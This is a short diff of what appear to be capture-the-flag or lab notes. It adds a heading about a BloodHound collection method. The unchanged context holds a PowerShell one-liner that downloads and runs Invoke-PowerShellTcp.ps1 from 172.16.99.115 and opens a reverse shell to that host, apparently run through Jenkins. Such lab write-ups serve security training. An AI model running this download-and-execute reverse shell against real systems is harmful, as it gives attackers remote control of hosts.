@@ -163,3 +163,5 @@ Use the modified version of invoke-powershelltcp.ps1 and download with jenkins t
 powershell.exe iex (iwr http://172.16.99.115/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.99.115 -Port 443
 ```
 ![[Pasted image 20231018153601.png]]
+
+### **FLAG 9 - Collection method in BloodHound that covers all the collection methods**
